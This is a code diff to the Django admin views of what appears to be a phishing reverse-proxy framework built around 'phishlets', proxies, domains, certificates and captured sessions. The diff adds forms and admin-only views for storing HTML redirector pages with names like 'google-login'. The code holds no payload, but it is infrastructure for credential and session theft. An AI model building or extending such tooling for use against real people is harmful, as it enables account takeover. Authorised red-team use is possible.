@@ -13,7 +13,7 @@ import base64
 import hashlib
 
 from django.db import models
-from .models import Phishlet, Proxy, DNSSettings, ProxyDomain, DomainCertificate, Session, NotificationSettings
+from .models import Phishlet, Proxy, DNSSettings, ProxyDomain, DomainCertificate, Session, NotificationSettings, Redirectors
 from . import dns_server as dns
 from . import http_server as http
 
@@ -83,7 +83,7 @@ def logout_view(request):
 class PhishletForm(forms.ModelForm):
     class Meta:
         model = Phishlet
-        fields = ["name", "is_active", "is_cache_enabled", "proxy_auth", "proxy", "data"]
+        fields = ["name", "is_active", "is_cache_enabled", "proxy_auth", "proxy", "redirector", "data"]
 
     def clean(self):
         cleaned = super().clean()
@@ -96,6 +96,36 @@ class PhishletForm(forms.ModelForm):
         # Ensure name inside data aligns (optional)
         if not data.get("name"):
             data["name"] = cleaned.get("name")
+        return cleaned
+
+
+class RedirectorForm(forms.ModelForm):
+    class Meta:
+        model = Redirectors
+        fields = ["name", "data"]
+        widgets = {
+            "name": forms.TextInput(attrs={
+                "class": "form-control",
+                "placeholder": "Enter redirector name (e.g., google-login, facebook-auth)"
+            }),
+            "data": forms.Textarea(attrs={
+                "class": "form-control",
+                "rows": 15,
+                "placeholder": "Enter HTML code for the redirector page..."
+            })
+        }
+
+    def clean(self):
+        cleaned = super().clean()
+        name = cleaned.get("name")
+        data = cleaned.get("data")
+        
+        if name and not name.replace("-", "").replace("_", "").isalnum():
+            raise ValidationError("Name can only contain letters, numbers, hyphens, and underscores.")
+        
+        if data and len(data.strip()) < 10:
+            raise ValidationError("HTML content must be at least 10 characters long.")
+        
         return cleaned
 
 
@@ -1421,3 +1451,70 @@ def update_session_data_view(request: HttpRequest, session_id: int) -> JsonRespo
             'success': False,
             'error': str(e)
         }, status=500)
+
+
+# Redirector Management Views
+@login_required
+@user_passes_test(is_admin)
+def redirector_list_view(request: HttpRequest) -> HttpResponse:
+    """List all redirectors"""
+    items = Redirectors.objects.all()
+    return render(request, "redirector_list.html", {"items": items})
+
+
+@login_required
+@user_passes_test(is_admin)
+def redirector_create_view(request: HttpRequest) -> HttpResponse:
+    """Create a new redirector"""
+    if request.method == "POST":
+        form = RedirectorForm(request.POST)
+        if form.is_valid():
+            form.save()
+            messages.success(request, "Redirector created successfully.")
+            return redirect("redirector_list")
+    else:
+        form = RedirectorForm()
+    return render(request, "redirector_form.html", {"form": form})
+
+
+@login_required
+@user_passes_test(is_admin)
+def redirector_edit_view(request: HttpRequest, pk: uuid.UUID) -> HttpResponse:
+    """Edit an existing redirector"""
+    instance = Redirectors.objects.get(pk=pk)
+    if request.method == "POST":
+        form = RedirectorForm(request.POST, instance=instance)
+        if form.is_valid():
+            form.save()
+            messages.success(request, "Redirector updated successfully.")
+            return redirect("redirector_list")
+    else:
+        form = RedirectorForm(instance=instance)
+    return render(request, "redirector_form.html", {"form": form, "instance": instance})
+
+
+@login_required
+@user_passes_test(is_admin)
+def redirector_delete_view(request: HttpRequest, pk: uuid.UUID) -> HttpResponse:
+    """Delete a redirector"""
+    if request.method != "POST":
+        return JsonResponse({"error": "POST required"}, status=405)
+    
+    try:
+        instance = Redirectors.objects.get(pk=pk)
+        redirector_name = instance.name
+        
+        # Check if any phishlets are using this redirector
+        phishlets_using = Phishlet.objects.filter(redirector=instance)
+        if phishlets_using.exists():
+            phishlet_names = [p.name for p in phishlets_using]
+            return JsonResponse({
+                "error": f"Cannot delete redirector '{redirector_name}' as it is being used by phishlets: {', '.join(phishlet_names)}"
+            }, status=400)
+        
+        instance.delete()
+        return JsonResponse({"ok": True, "message": f"Redirector '{redirector_name}' deleted successfully."})
+    except Redirectors.DoesNotExist:
+        return JsonResponse({"error": "Redirector not found."}, status=404)
+    except Exception as e:
+        return JsonResponse({"error": f"Error deleting redirector: {str(e)}"}, status=500)
